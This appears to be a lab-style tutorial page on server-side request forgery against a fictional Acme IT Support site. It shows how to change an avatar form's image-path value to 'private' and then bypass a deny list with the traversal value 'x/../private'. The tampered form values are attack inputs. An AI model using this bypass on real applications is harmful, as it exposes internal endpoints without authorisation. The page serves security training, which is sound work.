---
sidebar_position: 2
title: Server-Side Request Forgery 
---


We found two Endpoints during a content discovery exercise against the **Acme IT Support Website.** The first one is **`/private`**, which gives us an error message explaining that the contents **Cannot be Viewed from our IP Address.** 

The second is a new version of the customer account page at **`/customers/new-account-page`** with a new feature allowing customers to choose an **`Avatar`** for their Account.


<br/>

- **Creating an Account and Going to the Avatar Selection Page:**
	-  **Avatar Page:** `https://website.com/customers/new-account-page`
	-  Viewing the Page Source of the `Avatar Form`, we see the Avatar form field value contains the **Path to the Image.**

![SSRF](/img/vuln-web/s-one.png)


```html
<div class="col-xs-4">
	<div class="avatar-image" style="background-image: url('/assets/avatars/1.png')"></div>
	<input type="radio" name="avatar" value="assets/avatars/1.png">
</div>
```

<br/>

- **Changing The Avatar:**
	- If we choose one of the Avatars and then click the **Update Avatar Button,** we see the form change and, above it, display our **Currently Selected Avatar.** Viewing the Page Source will show our Current Avatar is displayed using the data URI Scheme, and the image content is `BASE64` Encoded.


![SSRF](/img/vuln-web/s-two.png)


```html
<div class="col-xs-6 col-xs-offset-3">
	<div><strong>Current Avatar</strong></div>
	<div class="avatar-image" style="background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHIAAACcCAYAAA==)"></div>
</div>
```

<br/>

- **Changing The Avatar Value to Private:**
	- We want the Server to access the Resource and get past the IP Address Block.
	- **Selecting an Avatar - Select Inspect on the Button** 
	- The web application has a Deny List in place and has Blocked Access to the `/private` Endpoint.


![SSRF](/img/vuln-web/s-three.png)

```html
<div class="col-xs-4">
	<div class="avatar-image" style="background-image: url('/assets/avatars/6.png')"></div>
	// highlight-next-line
	<input type="radio" name="avatar" value="private">
</div>
```

<br/>


- **Directory Traversal:**
	- **Endpoint:** `x/../private`

![SSRF](/img/vuln-web/s-four.png)


```html
<div class="col-xs-4">
	<div class="avatar-image" style="background-image: url('/assets/avatars/6.png')"></div>
	// highlight-next-line
	<input type="radio" name="avatar" value="x/../private">
</div>
```

We have now Bypassed the Restriction, and the user Updated the Avatar. This works because when the Web Server receives the Request for `x/../private` it knows that the `../` string means to **Move Up a Directory** that now translates the Request to just `/private`.